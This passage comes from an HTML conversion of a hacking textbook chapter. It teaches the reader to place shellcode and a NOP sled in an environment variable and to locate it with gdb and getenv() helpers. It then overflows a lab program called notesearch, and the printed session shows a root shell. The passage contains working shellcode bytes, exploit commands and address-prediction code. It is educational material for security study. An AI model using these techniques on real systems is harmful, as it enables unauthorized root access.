<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x331 Using the Environment</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part56.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part58.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark47">0x331 Using the Environment</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Sometimes a buffer will be too small to hold even shellcode. Fortunately, there are other locations in memory where shellcode can be stashed. Environment variables are used by the user shell for a variety of things, but what they are used for isn’t as important as the fact they are located on the stack and can be set from the shell. The example below sets an environment variable called <span class="s31">MYVAR </span>to the string <span class="s27">test</span>. This environment variable can be accessed by prepend- ing a dollar sign to its name. In addition, the <span class="s31">env </span>command will show all the environment variables. Notice there are several default environment vari- ables already set.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_409.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export MYVAR=test reader@hacking:~/booksrc $ echo $MYVAR</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">test</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ env SSH_AGENT_PID=7531</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SHELL=/bin/bash DESKTOP_STARTUP_ID=</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">TERM=xterm</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2 WINDOWID=39845969</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">OLDPWD=/home/reader USER=reader</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=4   0;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35: SSH_AUTH_SOCK=/tmp/ssh-EpSEbS7489/agent.7489 GNOME_KEYRING_SOCKET=/tmp/keyring-AyzuEi/socket SESSION_MANAGER=local/hacking:/tmp/.ICE-unix/7489 USERNAME=reader</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">DESKTOP_SESSION=default.desktop PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games GDM_XSERVER_LOCATION=local</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">PWD=/home/reader/booksrc LANG=en_US.UTF-8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">GDMSESSION=default.desktop HISTCONTROL=ignoreboth HOME=/home/reader</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SHLVL=1 GNOME_DESKTOP_SESSION_ID=Default</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">LOGNAME=reader DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus- DxW6W1OH1O,guid=4f4e0e9cc6f68009a059740046e28e35</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">LESSOPEN=| /usr/bin/lesspipe %s DISPLAY=:0.0</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">MYVAR=test <span class="s31">LESSCLOSE=/usr/bin/lesspipe %s %s RUNNING_UNDER_GDM=yes</span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">COLORTERM=gnome-terminal XAUTHORITY=/home/reader/.Xauthority</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">_=/usr/bin/env reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_410.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Similarly, the shellcode can be put in an environment variable, but first it needs to be in a form we can easily manipulate. The shellcode from the notesearch exploit can be used; we just need to put it into a file in binary form. The standard shell tools of <span class="s31">head</span>, <span class="s31">grep</span>, and <span class="s31">cut </span>can be used to isolate just the hex-expanded bytes of the shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_411.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: justify;">reader@hacking:~/booksrc $ head exploit_notesearch.c #include &lt;stdio.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">#include &lt;stdlib.h&gt; #include &lt;string.h&gt; char shellcode[]=</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">&quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot; &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot; &quot;\xe1\xcd\x80&quot;;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">int main(int argc, char *argv[]) { unsigned int i, *ptr, ret, offset=270;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ head exploit_notesearch.c | grep &quot;^\&quot;&quot; &quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot; &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot; &quot;\xe1\xcd\x80&quot;;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ head exploit_notesearch.c | grep &quot;^\&quot;&quot; | cut -d\&quot; -f2</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">\xe1\xcd\x80 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_412.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The first 10 lines of the program are piped into <span class="s31">grep</span>, which only shows the lines that begin with a quotation mark. This isolates the lines containing the shellcode, which are then piped into <span class="s31">cut </span>using options to display only the bytes between two quotation marks.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">BASH’s for loop can actually be used to send each of these lines to an <span class="s31">echo </span>command, with command-line options to recognize hex expansion and to suppress adding a newline character to the end.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_413.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ for i in $(head exploit_notesearch.c | grep &quot;^\&quot;&quot; | cut -d\&quot; -f2)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; do</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; echo -en $i</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; done &gt; shellcode.bin</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C shellcode.bin</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1.   j.XQh|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 89 |//shh/bin..Q..S.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020  e1 cd 80                      |.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000023</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_414.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now we have the shellcode in a file called shellcode.bin. This can be used with command substitution to put shellcode into an environment variable, along with a generous NOP sled.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_415.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(perl -e &#39;print &quot;\x90&quot;x200&#39;)$(cat shellcode.bin) reader@hacking:~/booksrc $ echo $SHELLCODE</p><p class="s66" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□</p><p class="s66" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□</p><p class="s66" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">□□□□□□□□□□□□□□□□□□□□□□□□□□□□<span class="s31">1</span>□<span class="s31">1</span>□<span class="s31">1</span>□□□ <span class="s31">j</span></p><p class="s31" style="padding-left: 215pt;text-indent: 0pt;text-align: left;">XQh//shh/bin<span class="s66">□□</span>Q<span class="s66">□□</span>S<span class="s66">□□</span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_416.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">And just like that, the shellcode is now on the stack in an environment variable, along with a 200-byte NOP sled. This means we just need to find an address somewhere in that range of the sled to overwrite the saved return address with. The environment variables are located near the bottom of the stack, so this is where we should look when running notesearch in a debugger.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_417.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./notesearch</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) break main</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x804873c (gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Starting program: /home/reader/booksrc/notesearch</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1, 0x0804873c in main () (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_418.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">A breakpoint is set at the beginning of <span class="s31">main()</span>, and the program is run. This will set up memory for the program, but it will stop before anything happens. Now we can examine memory down near the bottom of the stack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_419.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) i r esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">esp      0xbffff660    0xbffff660 (gdb) x/24s $esp + 0x240</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff8a0:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a1:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a2:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a3:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a4:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a5:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a6:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a7:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a8:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8a9:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8aa:   &quot;&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff8ab:   &quot;i686&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff8b0:   &quot;/home/reader/booksrc/notesearch&quot; 0xbffff8d0:   &quot;SSH_AGENT_PID=7531&quot;</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffffd56:   &quot;SHELLCODE=&quot;, &#39;\220&#39; &lt;repeats 190 times&gt;...</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff9ab:   &quot;\220\220\220\220\220\220\220\220\220\2201ï¿½1ï¿½1ï¿½\231ï¿½ï¿½ï¿½\200j\vXQh// shh/bin\211ï¿½Q\211ï¿½S\211ï¿½ï¿½\200&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff9d9:   &quot;TERM=xterm&quot; 0xbffff9e4:   &quot;DESKTOP_STARTUP_ID=&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff9f8:   &quot;SHELL=/bin/bash&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffffa08:   &quot;GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2&quot; 0xbffffa43:   &quot;WINDOWID=39845969&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffffa55:   &quot;USER=reader&quot; 0xbffffa61:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&quot;LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">;31:*.taz=0&quot;...</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffffb29:   &quot;1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">1:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">;35:*.tga=0&quot;...</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/s 0xbffff8e3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff8e3:   &quot;SHELLCODE=&quot;, &#39;\220&#39; &lt;repeats 190 times&gt;... (gdb) x/s 0xbffff8e3 + 100</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff947:    &#39;\220&#39; &lt;repeats 110 times&gt;, &quot;1ï¿½1ï¿½1ï¿½\231ï¿½ï¿½ï¿½\200j\vXQh//shh/bin\ 211ï¿½Q\211ï¿½S\211ï¿½ï¿½\200&quot;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_420.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 106%;text-align: left;">The debugger reveals the location of the shellcode, shown in bold above. (When the program is run outside of the debugger, these addresses might be a little different.) The debugger also has some information on the stack, which shifts the addresses around a bit. But with a 200-byte NOP sled, these inconsistencies aren’t a problem if an address near the middle of the sled is picked. In the output above, the address <span class="s31">0xbffff947 </span>is shown to be close to the middle of the NOP sled, which should give us enough wiggle room. After determining the address of the injected shellcode instructions, the exploita- tion is simply a matter of overwriting the return address with this address.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_421.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\x47\xf9\xff\xbf&quot;x40&#39;) [DEBUG] found a 34 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] found a 41 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">-------[ end of note data ]------- sh-3.2# whoami</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">root sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_422.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The target address is repeated enough times to overflow the return address, and execution returns into the NOP sled in the environment variable, which inevitably leads to the shellcode. In situations where the overflow buffer isn’t large enough to hold shellcode, an environment variable can be used with a large NOP sled. This usually makes exploitations quite a bit easier.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">A huge NOP sled is a great aid when you need to guess at the target return addresses, but it turns out that the locations of environment variables are easier to predict than the locations of local stack variables. In C’s standard library there is a function called <span class="s31">getenv()</span>, which accepts the name of an environ- ment variable as its only argument and returns that variable’s memory address. The code in getenv_example.c demonstrates the use of <span class="s31">getenv()</span>.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">getenv_example.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_423.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int main(int argc, char *argv[]) {</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">printf(&quot;%s is at %p\n&quot;, argv[1], getenv(argv[1]));</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_424.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">When compiled and run, this program will display the location of a given</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">environment variable in its memory. This provides a much more accurate prediction of where the same environment variable will be when the target program is run.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_425.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ gcc getenv_example.c reader@hacking:~/booksrc $ ./a.out SHELLCODE SHELLCODE is at 0xbffff90b</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\x0b\xf9\xff\xbf&quot;x40&#39;) [DEBUG] found a 34 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] found a 41 byte note for user id 999</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_426.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This is accurate enough with a large NOP sled, but when the same thing is attempted without a sled, the program crashes. This means the environ- ment prediction is still off.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_427.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin) reader@hacking:~/booksrc $ ./a.out SLEDLESS</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SLEDLESS is at 0xbfffff46</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\x46\xff\xff\xbf&quot;x40&#39;) [DEBUG] found a 34 byte note for user id 999</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] found a 41 byte note for user id 999</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">-------[ end of note data ]------- Segmentation fault reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_428.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In order to be able to predict an exact memory address, the differences in the addresses must be explored. The length of the name of the program being executed seems to have an effect on the address of the environment variables. This effect can be further explored by changing the name of the program and experimenting. This type of experimentation and pattern recognition is an important skill for a hacker to have.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_429.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ cp a.out a reader@hacking:~/booksrc $ ./a SLEDLESS SLEDLESS is at 0xbfffff4e reader@hacking:~/booksrc $ cp a.out bb reader@hacking:~/booksrc $ ./bb SLEDLESS SLEDLESS is at 0xbfffff4c reader@hacking:~/booksrc $ cp a.out ccc reader@hacking:~/booksrc $ ./ccc SLEDLESS SLEDLESS is at 0xbfffff4a reader@hacking:~/booksrc $ ./a.out SLEDLESS SLEDLESS is at 0xbfffff46 reader@hacking:~/booksrc $ gdb -q</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xbfffff4e - 0xbfffff46</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 8</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_430.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 107%;text-align: left;">As the preceding experiment shows, the length of the name of the execut- ing program has an effect on the location of exported environment variables. The general trend seems to be a decrease of two bytes in the address of the environment variable for every single-byte increase in the length of the pro- gram name. This holds true with the program name <span class="s27">a.out</span>, since the differ- ence in length between the names <span class="s27">a.out </span>and <span class="s27">a </span>is four bytes, and the difference between the address <span class="s31">0xbfffff4e </span>and <span class="s31">0xbfffff46 </span>is eight bytes. This must mean the name of the executing program is also located on the stack somewhere, which is causing the shifting.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Armed with this knowledge, the exact address of the environment vari- able can be predicted when the vulnerable program is executed. This means the crutch of a NOP sled can be eliminated. The getenvaddr.c program adjusts the address based on the difference in program name length to provide a very accurate prediction.</p><p class="s40" style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">getenvaddr.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_431.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;</p><p class="s31" style="padding-top: 2pt;padding-left: 104pt;text-indent: -12pt;text-align: left;">int main(int argc, char *argv[]) { char *ptr;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">if(argc &lt; 3) {</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">printf(&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;, argv[0]); exit(0);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">ptr = getenv(argv[1]); /* Get env var location. */</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */ printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: 